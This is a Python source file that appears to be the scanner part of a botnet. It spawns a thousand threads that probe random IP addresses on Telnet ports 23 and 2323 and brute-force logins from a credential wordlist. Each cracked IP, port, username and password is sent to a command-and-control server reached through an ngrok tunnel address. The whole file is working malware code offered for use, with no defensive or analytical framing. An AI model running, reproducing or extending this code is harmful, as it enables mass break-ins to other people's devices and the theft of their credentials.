from lib import telnet, tools, network, console
import threading, socket, time

__SCAN_TELNET__ = True
__SCAN_THREAD__ = 1000

__CNC_ADDR__ = '0.tcp.ngrok.io'
__CNC_PORT__ = 12681

class Data:
    def __init__(self):
        self.found = []

class MasterConnection(threading.Thread):
    def __init__(self, data: Data):
        threading.Thread.__init__(self)

        self.data = data
        self.console = console.Console()
        self.connected = False
        self.connection = None

    def connect(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        while True:
            if self.connected:
                break

            try:
                sock.connect((__CNC_ADDR__, __CNC_PORT__))
                self.connection = network.Network(sock)
                self.connected = True
                self.console.print_success('Connected to master')
                break
            except:
                time.sleep(1)
                pass
    
    def send_thread(self):
        while True:
            time.sleep(5)

            while not self.connected:
                time.sleep(5)
            
            if self.connection.raw_packet_list_send(self.data.found):
                self.console.print_success(f'{len(self.data.found)} devices was sent to master')
                self.data.found = []
            else:
                self.connect()
    
    def run(self):
        self.console.scanner_banner()
        self.connect()
        threading.Thread(target= self.send_thread).start()

# Todo: use queue module
class TelnetScanner(threading.Thread):
    def __init__(self, data: Data):
        threading.Thread.__init__(self)

        self.data = data
        self.ip_tools = tools.IP_Tools()
        self.port_checker = network.Port()
        self.telnet_credential = open('./asset/telnet_wordlist.txt', 'r+').read().splitlines()

    def brute(self, ip: str, port: int):
        for credential in self.telnet_credential:
            username = credential.split(':')[0]
            password = credential.split(':')[1]

            res = telnet.Telnet(ip, port, username, password).connect(2, True)

            if res == True:
                self.data.found.append(f'scan|{ip}|{port}|{username}|{password}|telnet') # scan|ip|port|user|pass|type
                break
            
            elif res == 'error':
                break

    def scan(self):
        while True:
            addr = self.ip_tools.get_ip_addr()

            for port in [23, 2323]:
                if self.port_checker.check_open(addr, port):
                    threading.Thread(target= self.brute, args=(addr, port,)).start()
    
    def run(self):
        if __SCAN_TELNET__ == False:
            return
        
        for _ in range(__SCAN_THREAD__):
            threading.Thread(target= self.scan).start()

if __name__ == '__main__':
    D = Data()
    TelnetScanner(D).start()
    MasterConnection(D).start()